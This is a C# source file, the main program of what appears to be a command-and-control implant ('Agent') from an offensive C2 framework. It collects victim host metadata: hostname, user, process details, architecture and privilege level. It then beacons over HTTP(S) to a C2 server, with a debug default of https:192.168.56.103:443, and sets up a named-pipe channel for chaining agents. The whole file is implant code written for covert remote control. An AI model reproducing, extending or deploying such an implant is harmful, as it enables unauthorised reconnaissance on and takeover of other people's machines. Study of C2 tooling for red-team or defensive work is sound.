using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {

        private static AgentMetadata s_metadata;

        static void Main(string[] args)
        {

#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
#endif

#if DEBUG
            if (args.Count() == 0)
                args = new string[] { "https:192.168.56.103:443"/*, "pipe:id"*/ };
                //args = new string[] { "pipe:aaaaaaaaaa" };
#endif


            GenerateMetadata();

            var agent = new Models.Agent(s_metadata);

            Thread agentThread = new Thread(agent.Start);
            agentThread.Start();

            foreach (var arg in args)
            {
                var tab = arg.Split(':');
                //Http communicator
                if ((tab.Length == 2 || tab.Length == 3) && (tab[0] == "http" || tab[0] == "https"))
                {
                    string protocol = tab[0];
                    string server = tab[1];
                    int port = tab.Length > 2 ? Convert.ToInt32(tab[2]) : tab[0] == "http" ? 80 : 443;

                    agent.HttpCommunicator.Init(protocol, server, port);
                    agent.HttpCommunicator.Start();
                }

                //Pipe Communicator
                if (tab.Length == 2 && tab[0] == "pipe")
                {
                    s_metadata.Id = tab[1];
                    agent.PipeCommunicator.Init(s_metadata.Id);
                }
                else
                {
                    agent.PipeCommunicator.Init();
                }
            }

            agent.PipeCommunicator.Start();


            agentThread.Join();
        }


        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            string integrity = "Medium";
            if (userName == "SYSTEM")
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            s_metadata = new AgentMetadata()
            {
                Id = ShortGuid.NewGuid(),
                Hostname = Environment.MachineName,
                UserName = userName,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
                Integrity = integrity,
            };

        }
    }
}
